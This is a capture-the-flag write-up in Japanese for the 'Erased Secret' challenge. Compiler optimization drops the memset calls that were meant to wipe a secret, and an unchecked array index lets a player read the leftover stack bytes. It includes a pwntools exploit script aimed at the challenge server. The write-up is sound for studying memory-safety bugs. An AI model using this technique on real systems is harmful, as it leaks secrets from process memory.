# Erased Secret

## 問題

消されたシークレットを当てよう！
```c
typedef unsigned char u8;

u8 target_hash[SHA256_DIGEST_LENGTH] = {};
size_t const SECRET_LEN = 32;

int prepare(void) {
  int fd;
  if ((fd = open("/dev/urandom", O_RDONLY)) == -1) {
    return 1;
  }
  u8 secret[SECRET_LEN + 1] = {};
  for (size_t i = 0; i < SECRET_LEN / 2; ++i) {
    u8 tmp;
    if (read(fd, &tmp, 1) != 1) {
      return 1;
    }
    snprintf(&secret[2 * i], 3, "%02x", tmp);
  }
  close(fd);

  SHA256(secret, SECRET_LEN, target_hash);
  printf("hash: ");
  for (size_t i = 0; i < SHA256_DIGEST_LENGTH; ++i) {
    printf("%02x", target_hash[i]);
  }
  puts("");

  memset(secret, '~', SECRET_LEN); // We overwrite the secret.
  memset(secret, 'X', SECRET_LEN); // Twice just in case.
  memset(secret, 0, SECRET_LEN);   // Thrice just to be sure.
  return 0;
}
```
```c
int challenge(void) {
  char q;
  u8 mem[0x100];
  printf("`?` for check, `!` for answer.\n");
  while (1) {
    printf("choice: ");
    if (scanf(" %c", &q) != 1) {
      return 1;
    }

    switch (q) {
    case '?': {
      printf("index: ");

      size_t i;
      if (scanf("%zu", &i) != 1) {
        return 1;
      }

      printf("mem[%zu] = 0x%02x\n", i, mem[i]);
      break;
    }
    case '!': {
      printf("secret: ");

      char buf[SECRET_LEN + 1] = {};
      scanf("%*[ \n]");
      fgets(buf, sizeof buf, stdin);

      u8 challenge_hash[SHA256_DIGEST_LENGTH] = {};
      SHA256(buf, SECRET_LEN, challenge_hash);

      return memcmp(challenge_hash, target_hash, SHA256_DIGEST_LENGTH);
    }
    default: {
      return 1;
    }
    }
  }
}

```

## 概要

`prepare`関数の処理を見てみると、まず、ランダムな16バイトを16進数で表した32文字を`secret`に入れています。

その後、`secret`のSHA256ハッシュ値をグローバル変数`target_hash`に退避したと思ったら、これでもかといわんばかりに`secret`に３回も上書きして消しているようです。

また、`challenge`関数では、消されたはずの`secret`を当ててフラグを得る必要がありますが、その前に`challenge`関数のローカル変数`mem`の値をインデックスを指定して好きなだけ観測できるようになっています。

```
$ nc 34.170.146.252 36195
hash: 5083595d26ceee652ae25132ce739e9735488bfe0f6e8c5bd409133d8269eb80
`?` for check, `!` for answer.
choice: ?
index: 1
mem[1] = 0x92
choice: ?
index: 10
mem[10] = 0x61
choice: ?
index: 100
mem[100] = 0xdf
choice: !
secret: 000102030405060708090a0b0c0d0e0f
Failed.
```

正誤判定はハッシュ値で行われるため`secret`そのものをどこかに残しておく必要性はないということでしょう。

どうすれば`secret`を当てることができるでしょうか？

## 方針

最適化によって上書き消去部分が無くなることを利用し、`prepare`関数のローカル変数の残骸を`challenge`関数で拾い集める。

## 解法

Ghidraで解析して`prepare`関数の部分を見てみると、
```c
(略)
    SHA256(secret,0x20,&target_hash);
    __printf_chk(2,"hash: ");
    do {
      uVar1 = *puVar5;
      puVar5 = puVar5 + 1;
      __printf_chk(2,&DAT_00102011,uVar1);
    } while (puVar5 != &_end);
    puts("");
    uVar3 = 0;
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
`puts("");`のあとに上書き消去している処理がありません。

これは、それ以降`secret`が使われないため、`-O2`オプションの最適化によって不要と判断された`memset`が削除されたのだと考えられます。

問題のTopicが`Optimization`であることからもこの方向で考えて良さそうです。

もしそうだとすると、2/22の過去問`Noob programmer`のときのように、`secret`の内容が`mem`配列の一部に現れるかもしれません。

しかし、各関数のローカル変数はこれらだけではなく、領域の配置順序もよくわからないことから、`mem`配列のどの場所を見ればいいかまではわかりません。

逆コンパイルしてアセンブリを読み解いてもいいですが、大変な作業になりそうな予感がします。

幸いなことに今回の問題では`secret`のハッシュ値が最初に示されているので、いろいろな位置でハッシュ値を計算してヒットする場所を探してみることにします。

`secret`のサイズが32、`mem`配列のサイズが0x100(=256)であることから、ズレを余裕をもって考慮し先頭を[200]～[299]くらいで回して調べれば大丈夫でしょう。

```py
import pwn
import hashlib

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 36195
p = pwn.remote(HOST, PORT)

# 正解のハッシュ値を取得する
d = p.recvuntil(b'choice: ')
h1 = d.decode().split()[1]
print("***", h1)
secret_hex = ''

# 最初の32バイト分を観測する
for i in range(200, 232):
    p.sendline(b'?')
    p.sendlineafter(b'index: ', str(i).encode())
    d = p.recvuntil(b'choice: ')
    secret_hex += d[13:15].decode()

# ハッシュ値を正解のものと比較し違ったら１バイト分差し替えて繰り返す
for i in range(200, 300):
    secret = bytes.fromhex(secret_hex)
    h2 = hashlib.sha256(secret).hexdigest()
    print(i, h2)
    if h1 == h2:
        break
    p.sendline(b'?')
    p.sendlineafter(b'index: ', str(i + 32).encode())
    d = p.recvuntil(b'choice: ')
    secret_hex = secret_hex[2:] + d[13:15].decode()

# 解答を送信しフラグを得る
p.sendline(b'!')
p.sendlineafter(b'secret: ', secret)
print(p.recvall().decode())
```
